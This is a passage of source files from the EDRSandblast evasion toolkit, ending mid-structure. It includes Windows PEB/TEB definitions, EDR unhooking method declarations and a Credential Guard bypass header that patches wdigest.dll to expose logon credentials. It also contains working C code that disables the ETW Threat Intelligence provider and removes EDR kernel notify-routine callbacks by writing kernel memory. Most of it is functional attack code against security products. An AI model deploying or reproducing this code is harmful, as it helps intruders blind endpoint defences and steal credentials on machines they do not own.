//      https://redplait.blogspot.com/2011/09/w8-64bit-teb-peb.html                             (TEB)
//
// [CHANGELIST]
//    2018-05-02:   -now can be compiled alongside windows.h (without changes) or by defining WANT_ALL_WINDOWS_H_DEFINITIONS so this file can be used standalone
//                  -this file may also be included alongside tebpeb32.h which can be found at http://bytepointer.com/resources/tebpeb32.h
//                  -64-bit types no longer clash with the 32-bit ones; e.g. UNICODE_STRING64, RTL_USER_PROCESS_PARAMETERS64, PEB64 (same result whether 32 or 64-bit compiler is used)
//                  -added more QWORD aliases (i.e. HANDLE64 and PTR64) so underlying types are clearer, however most PEB members remain generic QWORD placeholders for now
//                  -fixed missing semicolon bug in UNICODE_STRING64
//                  -added prliminary RTL_USER_PROCESS_PARAMETERS64 and TEB64 with offsets
//                  -included byte offsets for PEB64
//
//    2017-08-25:   initial public release
//


//
// base types
//

//always declare 64-bit types
#ifdef _MSC_VER
	//Visual C++
typedef unsigned __int64    QWORD;
typedef __int64             INT64;
#else
	//GCC
typedef unsigned long long  QWORD;
typedef long long           INT64;
#endif
typedef QWORD                   PTR64;
#ifndef __HANDLE64_DEFINED__
typedef QWORD                   HANDLE64;
#endif

#include <windows.h>
//UNCOMMENT line below if you are not including windows.h
//#define WANT_ALL_WINDOWS_H_DEFINITIONS
#ifdef WANT_ALL_WINDOWS_H_DEFINITIONS

//base types
typedef unsigned char           BYTE;
typedef char                    CHAR;
typedef unsigned short          WORD;
typedef short                   INT16;
typedef unsigned long           DWORD;
typedef long                    INT32;
typedef unsigned __int64        QWORD;
typedef __int64                 INT64;
typedef void* HANDLE;
typedef unsigned short          WCHAR;

//base structures
union LARGE_INTEGER
{
	struct
	{
		DWORD   LowPart;
		INT32   HighPart;
	} u;
	INT64       QuadPart;
};

union ULARGE_INTEGER
{
	struct
	{
		DWORD LowPart;
		DWORD HighPart;
	} u;
	QWORD       QuadPart;
};

#endif //#ifdef WANT_ALL_WINDOWS_H_DEFINITIONS

typedef struct UNICODE_STRING64
{
	union
	{
		struct
		{
			WORD Length;
			WORD MaximumLength;
		} u;
		QWORD dummyalign;
	} uOrDummyAlign;
	WCHAR* Buffer;
} UNICODE_STRING64, * PUNICODE_STRING64;

typedef struct _CLIENT_ID64
{
	QWORD  ProcessId;
	QWORD  ThreadId;
} CLIENT_ID64;

//NOTE: the members of this structure are not yet complete
typedef struct _RTL_USER_PROCESS_PARAMETERS64
{
	BYTE                    Reserved1[16];                 //0x00
	QWORD                   Reserved2[5];                  //0x10
	UNICODE_STRING64        CurrentDirectoryPath;          //0x38
	HANDLE64                CurrentDirectoryHandle;        //0x48
	UNICODE_STRING64        DllPath;                       //0x50
	UNICODE_STRING64        ImagePathName;                 //0x60
	UNICODE_STRING64        CommandLine;                   //0x70
	PTR64                   Environment;                   //0x80
} RTL_USER_PROCESS_PARAMETERS64;

//
// PEB64 structure - TODO: comb more through http://terminus.rewolf.pl/terminus/structures/ntdll/_PEB_x64.html and add OS delineations and Windows 10 updates
//
// The structure represented here is a work-in-progress as only members thru offset 0x320 are listed; the actual sizes per OS are:
//    0x0358    XP/WS03
//    0x0368    Vista
//    0x037C    Windows 7
//    0x0388    Windows 8
//    0x07A0    Windows 10
//
typedef struct PEB64
{
	union
	{
		struct
		{
			BYTE InheritedAddressSpace;                                 //0x000
			BYTE ReadImageFileExecOptions;                              //0x001
			BYTE BeingDebugged;                                         //0x002
			BYTE _SYSTEM_DEPENDENT_01;                                  //0x003
		} flags;
		QWORD dummyalign;
	} dword0;
	QWORD                           Mutant;                             //0x0008
	QWORD                           ImageBaseAddress;                   //0x0010
	PEB_LDR_DATA* Ldr;                                //0x0018
	PTR64                           ProcessParameters;                  //0x0020 / pointer to RTL_USER_PROCESS_PARAMETERS64
	QWORD                           SubSystemData;                      //0x0028
	QWORD                           ProcessHeap;                        //0x0030
	QWORD                           FastPebLock;                        //0x0038
	QWORD                           _SYSTEM_DEPENDENT_02;               //0x0040
	QWORD                           _SYSTEM_DEPENDENT_03;               //0x0048
	QWORD                           _SYSTEM_DEPENDENT_04;               //0x0050
	union
	{
		QWORD                       KernelCallbackTable;                //0x0058
		QWORD                       UserSharedInfoPtr;                  //0x0058
	}KernelCallbackTableOrUserSharedInfoPtr;
	DWORD                           SystemReserved;                     //0x0060
	DWORD                           _SYSTEM_DEPENDENT_05;               //0x0064
	QWORD                           _SYSTEM_DEPENDENT_06;               //0x0068
	QWORD                           TlsExpansionCounter;                //0x0070
	QWORD                           TlsBitmap;                          //0x0078
	DWORD                           TlsBitmapBits[2];                   //0x0080
	QWORD                           ReadOnlySharedMemoryBase;           //0x0088
	QWORD                           _SYSTEM_DEPENDENT_07;               //0x0090
	QWORD                           ReadOnlyStaticServerData;           //0x0098
	QWORD                           AnsiCodePageData;                   //0x00A0
	QWORD                           OemCodePageData;                    //0x00A8
	QWORD                           UnicodeCaseTableData;               //0x00B0
	DWORD                           NumberOfProcessors;                 //0x00B8
	union
	{
		DWORD                       NtGlobalFlag;                       //0x00BC
		DWORD                       dummy02;                            //0x00BC
	}NtGlobalFlagOrdummy02;
	LARGE_INTEGER                   CriticalSectionTimeout;             //0x00C0
	QWORD                           HeapSegmentReserve;                 //0x00C8
	QWORD                           HeapSegmentCommit;                  //0x00D0
	QWORD                           HeapDeCommitTotalFreeThreshold;     //0x00D8
	QWORD                           HeapDeCommitFreeBlockThreshold;     //0x00E0
	DWORD                           NumberOfHeaps;                      //0x00E8
	DWORD                           MaximumNumberOfHeaps;               //0x00EC
	QWORD                           ProcessHeaps;                       //0x00F0
	QWORD                           GdiSharedHandleTable;               //0x00F8
	QWORD                           ProcessStarterHelper;               //0x0100
	QWORD                           GdiDCAttributeList;                 //0x0108
	QWORD                           LoaderLock;                         //0x0110
	DWORD                           OSMajorVersion;                     //0x0118
	DWORD                           OSMinorVersion;                     //0x011C
	WORD                            OSBuildNumber;                      //0x0120
	WORD                            OSCSDVersion;                       //0x0122
	DWORD                           OSPlatformId;                       //0x0124
	DWORD                           ImageSubsystem;                     //0x0128
	DWORD                           ImageSubsystemMajorVersion;         //0x012C
	QWORD                           ImageSubsystemMinorVersion;         //0x0130
	union
	{
		QWORD                       ImageProcessAffinityMask;           //0x0138
		QWORD                       ActiveProcessAffinityMask;          //0x0138
	}ImageProcessAffinityMaskOrActiveProcessAffinityMask;
	QWORD                           GdiHandleBuffer[30];                //0x0140
	QWORD                           PostProcessInitRoutine;             //0x0230
	QWORD                           TlsExpansionBitmap;                 //0x0238
	DWORD                           TlsExpansionBitmapBits[32];         //0x0240
	QWORD                           SessionId;                          //0x02C0
	ULARGE_INTEGER                  AppCompatFlags;                     //0x02C8
	ULARGE_INTEGER                  AppCompatFlagsUser;                 //0x02D0
	QWORD                           pShimData;                          //0x02D8
	QWORD                           AppCompatInfo;                      //0x02E0
	UNICODE_STRING64                CSDVersion;                         //0x02E8
	QWORD                           ActivationContextData;              //0x02F8
	QWORD                           ProcessAssemblyStorageMap;          //0x0300
	QWORD                           SystemDefaultActivationContextData; //0x0308
	QWORD                           SystemAssemblyStorageMap;           //0x0310
	QWORD                           MinimumStackCommit;                 //0x0318

} PEB64, * PPEB64; //struct PEB64

//
// TEB64 structure - preliminary structure; the portion listed current at least as of Windows 8
//
typedef struct TEB64
{
	BYTE                            NtTib[56];                          //0x0000 / NT_TIB64 structure
	PTR64                           EnvironmentPointer;                 //0x0038
	CLIENT_ID64                     ClientId;                           //0x0040
	PTR64                           ActiveRpcHandle;                    //0x0050
	PTR64                           ThreadLocalStoragePointer;          //0x0058
	PTR64                           ProcessEnvironmentBlock;            //0x0060 / ptr to PEB64
	DWORD                           LastErrorValue;                     //0x0068
	DWORD                           CountOfOwnedCriticalSections;       //0x006C
	PTR64                           CsrClientThread;                    //0x0070
	PTR64                           Win32ThreadInfo;                    //0x0078
	DWORD                           User32Reserved[26];                 //0x0080
	DWORD                           UserReserved[6];                    //0x00E8
	PTR64                           WOW32Reserved;                      //0x0100
	DWORD                           CurrentLocale;                      //0x0108
	DWORD                           FpSoftwareStatusRegister;           //0x010C
	PTR64                           SystemReserved1[54];                //0x0110
	DWORD                           ExceptionCode;                      //0x02C0
	PTR64                           ActivationContextStackPointer;      //0x02C8

} TEB64; //struct TEB64

```

`EDRSandblast/Includes/UserlandHooks.h`:

```h
#pragma once
#include "PEParser.h"

// Sets an arbitrary maximum size of a hook ; ideally, this should be the minimum value of all (potentially patched) functions' lengths
#if _WIN64
#define PATCH_MAX_SIZE 0x18
#else
#define PATCH_MAX_SIZE 0x10
#endif

typedef struct PATCH_DIFF_t {
    PVOID disk_ptr;
    PVOID mem_ptr;
    size_t size;
} PATCH_DIFF;

typedef struct HOOK_t {
    PVOID disk_function;
    PVOID mem_function;
    LPCSTR functionName;
    PATCH_DIFF* list_patches;
} HOOK;

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory) (
    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T           NumberOfBytesToProtect,
    IN ULONG                NewAccessProtection,
    OUT PULONG              OldAccessProtection);

typedef NTSTATUS(NTAPI* pRtlGetVersion)(
    OUT LPOSVERSIONINFOEXW lpVersionInformation);

typedef enum UNHOOK_METHOD_e {
    UNHOOK_NONE,

    // Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all detected hooks
    UNHOOK_WITH_NTPROTECTVIRTUALMEMORY,

    // Constructs an "unhooked" (i.e. unmonitored) version of NtProtectVirtualMemory, by allocating an executable trampoling jumping over the hook, and remove all detected hooks
    UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE,

    // Search for an existing trampoline allocated by the EDR itself, to get an "unhooked" (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all detected hooks
    UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE,

    // Loads an additionnal version of ntdll library into memory, and use the (hopefully unmonitored) version of NtProtectVirtualMemory present in this library to remove all detected hooks
    UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY,

    // Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory, and uses it to remove all detected hooks
    UNHOOK_WITH_DIRECT_SYSCALL
}UNHOOK_METHOD;

_Ret_notnull_ HOOK* searchHooks(const char* csvFileName);
PVOID hookResolver(PBYTE hookAddr);
pNtProtectVirtualMemory getSafeVirtualProtectUsingTrampoline(DWORD unhook_method);
PVOID searchTrampolineInExecutableMemory(PVOID pattern, size_t patternSize, PVOID expectedTarget);
PBYTE findDiff(PBYTE mem, PBYTE disk, size_t len, size_t* lenPatch);
VOID unhook(HOOK* hook, UNHOOK_METHOD unhook_method);


/*
* Cache for NTDLL PE (accessed often)
*/
PE* ntdllDiskPe_g;
PE* ntdllMemPe_g;
void getNtdllPEs(PE** ntdllPE_mem, PE** ntdllPE_disk);
```

`EDRSandblast/Includes/WdigestOffsets.h`:

```h
/*

--- Functions to bypass Credential Guard by enabling Wdigest through patching of the g_fParameter_UseLogonCredential and g_IsCredGuardEnabled attributes in memory.
--- Full source and credit to https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
--- Code adapted from: https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

*/

#pragma once

#include <Windows.h>


enum WdigestOffsetType {
    g_fParameter_UseLogonCredential = 0,
    g_IsCredGuardEnabled = 1,
    _SUPPORTED_WDIGEST_OFFSETS_END
};

union WdigestOffsets {
    // structure version of wdigest.dll's offsets
    struct {
        // wdigest.dll's g_fParameter_UseLogonCredential
        DWORD64 g_fParameter_UseLogonCredential;
        // wdigest.dll's g_IsCredGuardEnabled 
        DWORD64 g_IsCredGuardEnabled;
    } st;

    // array version (usefull for code factoring)
    DWORD64 ar[2];
};

union WdigestOffsets g_wdigestOffsets;

// Return the offsets of nt!PspCreateProcessNotifyRoutine, nt!PspCreateThreadNotifyRoutine, nt!PspLoadImageNotifyRoutine, and nt!_PS_PROTECTION for the specific Windows version in use.
void LoadWdigestOffsetsFromFile(TCHAR* wdigestOffsetFilename);
void SaveWdigestOffsetsToFile(TCHAR* wdigestOffsetFilename);

void LoadWdigestOffsetsFromInternet(BOOL delete_pdb);

LPTSTR GetWdigestPath();
```

`EDRSandblast/Includes/WindowsServiceOps.h`:

```h
#pragma once

#include <Windows.h>
#include <aclapi.h>
#include <Tchar.h>
#include <stdio.h>
#include <time.h>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) _tprintf_or_not(TEXT("[!] ERROR ") TEXT(__FUNCTION__) TEXT(" ; ") func TEXT(" (0x%08x)\n"), GetLastError())
#endif

#define MAX_UNINSTALL_ATTEMPTS 3
#define OP_SLEEP_TIME 1000

BOOL ServiceAddEveryoneAccess(SC_HANDLE serviceHandle);

BOOL ServiceGenericControl(PCTSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus);

DWORD ServiceInstall(PCTSTR serviceName, PCTSTR displayName, PCTSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt);

BOOL ServiceUninstall(PCTSTR serviceName, DWORD attemptCount);
```

`EDRSandblast/KernellandBypass/ETWThreatIntel.c`:

```c
/*

--- ETW Threat Intelligence operations.
--- Inspiration and credit: https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider

*/

#include <Windows.h>
#include <Tchar.h>

#include "../EDRSandBlast.h"
#include "ETWThreatIntel.h"
#include "KernelMemoryPrimitives.h"
#include "NtoskrnlOffsets.h"


DWORD64 GetEtwThreatInt_ProviderEnableInfoAddress(BOOL verbose) {
    if (g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle == 0x0 || g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry == 0x0 || g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo == 0x0) {
        _putts_or_not(TEXT("[!] [ETWTI]\tETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel."));
        return 0x0;
    }

    DWORD64 etwThreatInt_ETW_REG_ENTRYAddress = ReadKernelMemoryDWORD64(g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle);
    if (verbose) {
        _tprintf_or_not(TEXT("[+] [ETWTI]\tFound ETW Threat Intel provider _ETW_REG_ENTRY at 0x%I64x\n"), etwThreatInt_ETW_REG_ENTRYAddress);
    }
    DWORD64 etwThreatInt_ETW_GUID_ENTRYAddress = ReadMemoryDWORD64(etwThreatInt_ETW_REG_ENTRYAddress + g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry);
    
    return etwThreatInt_ETW_GUID_ENTRYAddress + g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo;
}

void EnableDisableETWThreatIntelProvider(BOOL verbose, BOOL enable) {
    DWORD64 etwThreatInt_ProviderEnableInfoAddress = GetEtwThreatInt_ProviderEnableInfoAddress(verbose);
    if (etwThreatInt_ProviderEnableInfoAddress == 0x0) {
        return;
    }

    _tprintf_or_not(TEXT("[+] [ETWTI]\t%s the ETW Threat Intel provider by patching ProviderEnableInfo at 0x%I64x with 0x%02X.\n"),
        enable ? TEXT("(Re)enabling") : TEXT("Disabling"), etwThreatInt_ProviderEnableInfoAddress, enable ? ENABLE_PROVIDER : DISABLE_PROVIDER);
    WriteMemoryBYTE(etwThreatInt_ProviderEnableInfoAddress, enable ? ENABLE_PROVIDER : DISABLE_PROVIDER);

    _tprintf_or_not(TEXT("[+] [ETWTI]\tThe ETW Threat Intel provider was successfully %s!\n"), enable ? TEXT("enabled") : TEXT("disabled"));
}


void DisableETWThreatIntelProvider(BOOL verbose) {
    EnableDisableETWThreatIntelProvider(verbose, FALSE);
}


void EnableETWThreatIntelProvider(BOOL verbose) {
    EnableDisableETWThreatIntelProvider(verbose, TRUE);
}


BOOL isETWThreatIntelProviderEnabled(BOOL verbose) {
    DWORD64 etwThreatInt_ProviderEnableInfoAddress = GetEtwThreatInt_ProviderEnableInfoAddress(verbose);

    if (etwThreatInt_ProviderEnableInfoAddress == 0x0) {
        return FALSE;
    }
    
    BYTE etwThreatInt_ProviderEnableInfoValue = ReadMemoryBYTE(etwThreatInt_ProviderEnableInfoAddress);

    return etwThreatInt_ProviderEnableInfoValue == ENABLE_PROVIDER;
}
```

`EDRSandblast/KernellandBypass/KernelCallbacks.c`:

```c
/*

--- Kernel callbacks operations.
--- Inspiration and credit: https://github.com/br-sn/CheekyBlinder

*/

#include <Windows.h>

#include "../EDRSandblast.h"
#include "FileUtils.h"
#include "FileVersion.h"
#include "IsEDRChecks.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "NtoskrnlOffsets.h"
#include "PEParser.h"
#include "PdbSymbols.h"

#include "KernelCallbacks.h"

const TCHAR* notifyRoutineTypeStrs[3] = { TEXT("process creation"), TEXT("thread creation"), TEXT("image loading") };
const TCHAR* notifyRoutineTypeNames[3] = { TEXT("ProcessCreate"), TEXT("ThreadCreate"), TEXT("LoadImage") };
DWORD64 GetNotifyRoutineAddress(enum NtoskrnlOffsetType nrt);

BOOL EnumEDRSpecificNotifyRoutineCallbacks(enum NtoskrnlOffsetType notifyRoutineType, struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL verbose) {
    DWORD64 NotifyRoutineAddress = GetNotifyRoutineAddress(notifyRoutineType);
    _tprintf_or_not(TEXT("[+] [NotifyRountines]\tEnumerating %s callbacks\n"), notifyRoutineTypeStrs[notifyRoutineType]);
    if (verbose) { _tprintf_or_not(TEXT("[+] [NotifyRountines]\tPsp%sNotifyRoutine: 0x%I64x\n"), notifyRoutineTypeNames[notifyRoutineType], NotifyRoutineAddress); }

    SIZE_T CurrentEDRCallbacksCount = 0;
    for (int i = 0; i < PSP_MAX_CALLBACKS; ++i) {
        DWORD64 callback_struct = ReadMemoryDWORD64(NotifyRoutineAddress + (i * sizeof(DWORD64)));
        if (callback_struct != 0) {
            DWORD64 callback = (callback_struct & ~0b1111) + 8; //TODO : replace this hardcoded offset ?
            DWORD64 cbFunction = ReadMemoryDWORD64(callback);
            DWORD64 driverOffset;
            TCHAR* driver = FindDriverName(cbFunction, &driverOffset);
            _tprintf_or_not(TEXT("[+] [NotifyRountines]\t\t%016llx [%s + 0x%llx]\n"), cbFunction, driver, driverOffset);

            if (driver && isDriverNameMatchingEDR(driver)) { //TODO : also use certificates to determine if EDR
                DWORD64 callback_addr = NotifyRoutineAddress + (i * sizeof(DWORD64));

                struct KRNL_CALLBACK newFoundDriver = { 0 };
                newFoundDriver.type = NOTIFY_ROUTINE_CB;
                newFoundDriver.driver_name = driver;
                newFoundDriver.addresses.notify_routine.callback_struct_addr = callback_addr;
                newFoundDriver.addresses.notify_routine.callback_struct = callback_struct;
                newFoundDriver.addresses.notify_routine.type = notifyRoutineType;
                newFoundDriver.callback_func = cbFunction;

                _tprintf_or_not(TEXT("[+] [NotifyRountines]\t\tFound callback belonging to EDR driver %s"), driver);
                if (verbose) {
                    _tprintf_or_not(TEXT(" [callback addr : 0x%I64x | callback struct : 0x%I64x | callback function : 0x%I64x]\n"), callback_addr, callback_struct, cbFunction);
                }
                else {
                    _putts_or_not(TEXT(""));
                }
                newFoundDriver.removed = FALSE;
                
                edrCallbacks->EDR_CALLBACKS[edrCallbacks->index] = newFoundDriver;
                edrCallbacks->index++;
                CurrentEDRCallbacksCount++;
            }
        }
    }

    if (CurrentEDRCallbacksCount == 0) {
        _putts_or_not(TEXT("[+] [NotifyRountines]\tNo EDR driver(s) found!"));
    }
    else {
        _tprintf_or_not(TEXT("[+] [NotifyRountines]\tFound a total of %llu EDR / security products driver(s)\n"), CurrentEDRCallbacksCount);
    }
    return CurrentEDRCallbacksCount > 0;
}

void RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(enum NtoskrnlOffsetType notifyRoutineType, struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL remove) {
    TCHAR* action = remove ? TEXT("Removing") : TEXT("Restoring");
    _tprintf_or_not(TEXT("[+] [NotifyRountines]\t%s %s callbacks\n"), action, notifyRoutineTypeStrs[notifyRoutineType]);

    for (DWORD i = 0; i < edrCallbacks->index; ++i) {
        struct KRNL_CALLBACK* cb = &edrCallbacks->EDR_CALLBACKS[i];
        if (cb->type == NOTIFY_ROUTINE_CB && 
            cb->addresses.notify_routine.type == notifyRoutineType &&
            cb->removed == !remove) {
            _tprintf_or_not(TEXT("[+] [NotifyRountines]\t%s callback of EDR driver \"%s\" [callback addr: 0x%I64x | callback struct: 0x%I64x | callback function: 0x%I64x]\n"),
                action,
                cb->driver_name,
                cb->addresses.notify_routine.callback_struct_addr,
                cb->addresses.notify_routine.callback_struct,
                cb->callback_func);
            DWORD64 value_to_write = remove ? 0 : cb->addresses.notify_routine.callback_struct;
            WriteMemoryDWORD64(cb->addresses.notify_routine.callback_struct_addr, value_to_write);
            cb->removed = !cb->removed;
        }
    }
}

void RemoveOrRestoreEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL remove) {
    RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(CREATE_PROCESS_ROUTINE, edrCallbacks, remove);
    RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(CREATE_THREAD_ROUTINE, edrCallbacks, remove);
    RemoveOrRestoreSpecificEDRNotifyRoutineCallbacks(LOAD_IMAGE_ROUTINE, edrCallbacks, remove);
}


/*

------ Generic callbacks manipulation.

*/


DWORD64 GetNotifyRoutineAddress(enum NtoskrnlOffsetType nrt) {
    DWORD64 Ntoskrnlbaseaddress = FindNtoskrnlBaseAddress();
    DWORD64 Psp_X_NotifyRoutineOffset = g_ntoskrnlOffsets.ar[nrt];
    DWORD64 Psp_X_NotifyRoutineAddress = Ntoskrnlbaseaddress + Psp_X_NotifyRoutineOffset;
    return Psp_X_NotifyRoutineAddress;
}

/*

------ All EDR Kernel callbacks enumeration / removal.

*/

BOOL EnumEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks, BOOL verbose) {
    BOOL found = FALSE;
    found |= EnumEDRSpecificNotifyRoutineCallbacks(CREATE_PROCESS_ROUTINE, edrCallbacks, verbose);
    found |= EnumEDRSpecificNotifyRoutineCallbacks(CREATE_THREAD_ROUTINE, edrCallbacks, verbose);
    found |= EnumEDRSpecificNotifyRoutineCallbacks(LOAD_IMAGE_ROUTINE, edrCallbacks, verbose);
    return found;
}

void RemoveEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
    RemoveOrRestoreEDRNotifyRoutineCallbacks(edrCallbacks, TRUE);
}

void RestoreEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
    RemoveOrRestoreEDRNotifyRoutineCallbacks(edrCallbacks, FALSE);
}
```

`EDRSandblast/KernellandBypass/KernelUtils.c`:

```c
#include <Windows.h>
#include <Psapi.h>
#include <Tchar.h>

#include "../EDRSandblast.h"

DWORD64 g_NtoskrnlBaseAddress;
DWORD64 FindNtoskrnlBaseAddress(void) {
    if (g_NtoskrnlBaseAddress == 0) {
        DWORD cbNeeded = 0;
        LPVOID drivers[1024] = { 0 };

        if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
            g_NtoskrnlBaseAddress = (DWORD64)drivers[0];
        }
        else {
            return 0;
        }
    }
    return g_NtoskrnlBaseAddress;
}

/*
* Returns the name of the driver where "address" seems to be located
* Optionnaly, return in "offset" the distance between "address" and the driver base address.
*/
TCHAR* FindDriverName(DWORD64 address, _Out_opt_ PDWORD64 offset) {
    LPVOID drivers[1024] = { 0 };
    DWORD cbNeeded;
    int cDrivers = 0;
    int i = 0;
    TCHAR szDriver[1024] = { 0 };
    DWORD64 minDiff = MAXDWORD64;
    DWORD64 diff;
    if (offset) {
        *offset = 0;
    }
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < cDrivers; i++) {
            if ((DWORD64)drivers[i] <= address) {
                diff = address - (DWORD64)drivers[i];
                if (diff < minDiff) {
                    minDiff = diff;
                }
            }
        }
    }
    else {
        _tprintf_or_not(TEXT("[!] Could not resolve driver for 0x%I64x, an EDR driver might be missed\n"), address);
        return NULL;
    }

    if (GetDeviceDriverBaseName((LPVOID)(address - minDiff), szDriver, _countof(szDriver))) {

        if (offset) {
            *offset = minDiff;
        }

        TCHAR* const szDriver_cpy = _tcsdup(szDriver);

        if (!szDriver_cpy) {
            _putts_or_not(TEXT("[!] Couldn't allocate memory to store the driver name"));
            return NULL;
        }

        return szDriver_cpy;
    }
    else {
        _tprintf_or_not(TEXT("[!] Could not resolve driver for 0x%I64x, an EDR driver might be missed\n"), address);
        return NULL;
    }
}

/*
* Return the driver path given an address in kernel memory (the driver base or an address inside)
* TODO : might return paths that begins with "\systemroot\" for the moment, need fixing (cf. Firewalling.c)
*/
TCHAR* FindDriverPath(DWORD64 address) {
    DWORD64 offset;
    TCHAR* name = FindDriverName(address, &offset);
    free(name);
    name = NULL;
    DWORD64 driverBaseAddress = address - offset;
    TCHAR szDriver[MAX_PATH] = { 0 };
    GetDeviceDriverFileName((PVOID)driverBaseAddress, szDriver, _countof(szDriver));
    TCHAR* const szDriver_cpy = _tcsdup(szDriver);

    if (!szDriver_cpy) {
        _putts_or_not(TEXT("[!] Couldn't allocate memory to store the driver path"));
        return NULL;
    }

    return szDriver_cpy;
}

DWORD64 GetKernelFunctionAddress(LPCSTR function) {
    DWORD64 ntoskrnlBaseAddress = FindNtoskrnlBaseAddress();
    DWORD64 address = 0;
    HMODULE ntoskrnl = LoadLibrary(TEXT("ntoskrnl.exe"));
    if (ntoskrnl) {
        DWORD64 offset = (DWORD64)(GetProcAddress(ntoskrnl, function)) - (DWORD64)(ntoskrnl);
        address = ntoskrnlBaseAddress + offset;
        FreeLibrary(ntoskrnl);
    }
    // _tprintf_or_not(TEXT("[+] %s address: 0x%I64x\n"), function, address);
    return address;
}
```

`EDRSandblast/KernellandBypass/ObjectCallbacks.c`:

```c
#include <Tchar.h>
#include <Windows.h>

#include "../EDRSandblast.h"
#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "NtoskrnlOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"

#include "ObjectCallbacks.h"


typedef enum OB_OPERATION_e {
    OB_OPERATION_HANDLE_CREATE = 1,
    OB_OPERATION_HANDLE_DUPLICATE = 2,
    OB_FLT_REGISTRATION_VERSION = 0x100
} OB_OPERATION;

typedef struct UNICODE_STRING_t {
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
} UNICODE_STRING;

#define GET_OFFSET(STRUCTNAME, OFFSETNAME) Offset_ ## STRUCTNAME ## _ ## OFFSETNAME = GetFieldOffset(sym_ctx, #STRUCTNAME, L###OFFSETNAME)
#define GET_SYMBOL(SYMBOL) Sym_ ## SYMBOL = GetSymbolOffset(sym_ctx, #SYMBOL)


typedef struct OB_CALLBACK_t OB_CALLBACK;

typedef PVOID POBJECT_TYPE, POB_PRE_OPERATION_CALLBACK, POB_POST_OPERATION_CALLBACK;
/*
* Internal / undocumented version of OB_OPERATION_REGISTRATION
*/
typedef struct OB_CALLBACK_ENTRY_t {
    LIST_ENTRY CallbackList; // linked element tied to _OBJECT_TYPE.CallbackList
    OB_OPERATION Operations; // bitfield : 1 for Creations, 2 for Duplications
    BOOL Enabled;            // self-explanatory
    OB_CALLBACK* Entry;      // points to the structure in which it is included
    POBJECT_TYPE ObjectType; // points to the object type affected by the callback
    POB_PRE_OPERATION_CALLBACK PreOperation;      // callback function called before each handle operation
    POB_POST_OPERATION_CALLBACK PostOperation;     // callback function called after each handle operation
    KSPIN_LOCK Lock;         // lock object used for synchronization
} OB_CALLBACK_ENTRY;

/*
* A callback entry is made of some fields followed by concatenation of callback entry items, and the buffer of the associated Altitude string
* Internal / undocumented (and compact) version of OB_CALLBACK_REGISTRATION
*/
typedef struct OB_CALLBACK_t {
    USHORT Version;                           // usually 0x100
    USHORT OperationRegistrationCount;        // number of registered callbacks
    PVOID RegistrationContext;                // arbitrary data passed at registration time
    UNICODE_STRING AltitudeString;            // used to determine callbacks order
    struct OB_CALLBACK_ENTRY_t EntryItems[1]; // array of OperationRegistrationCount items
    WCHAR AltitudeBuffer[1];                  // is AltitudeString.MaximumLength bytes long, and pointed by AltitudeString.Buffer
} OB_CALLBACK;


//TODO : find a way to reliably find the offsets
DWORD64 Offset_CALLBACK_ENTRY_ITEM_Operations = offsetof(OB_CALLBACK_ENTRY, Operations); //BOOL
DWORD64 Offset_CALLBACK_ENTRY_ITEM_Enabled = offsetof(OB_CALLBACK_ENTRY, Enabled); //DWORD
DWORD64 Offset_CALLBACK_ENTRY_ITEM_ObjectType = offsetof(OB_CALLBACK_ENTRY, ObjectType); //POBJECT_TYPE
DWORD64 Offset_CALLBACK_ENTRY_ITEM_PreOperation = offsetof(OB_CALLBACK_ENTRY, PreOperation); //POB_PRE_OPERATION_CALLBACK
DWORD64 Offset_CALLBACK_ENTRY_ITEM_PostOperation = offsetof(OB_CALLBACK_ENTRY, PostOperation); //POB_POST_OPERATION_CALLBACK

//TODO : parse the bitfield in the PDB symbols to ensure "SupportsObjectCallbacks" is bit 6
WORD SupportsObjectCallbacks_bit = 0x40;

struct ObjTypeSubjectToCallback {
    TCHAR* name;
    DWORD64 offset;
    DWORD64 callbackListAddress;
    DWORD64 callbackListFlinkBackup;
    DWORD64 callbackListBlinkBackup;
    SIZE_T nbCallbacks;
} ObjectTypesSubjectToCallback[2] = {
    {.name = TEXT("Process"), .offset = 0},
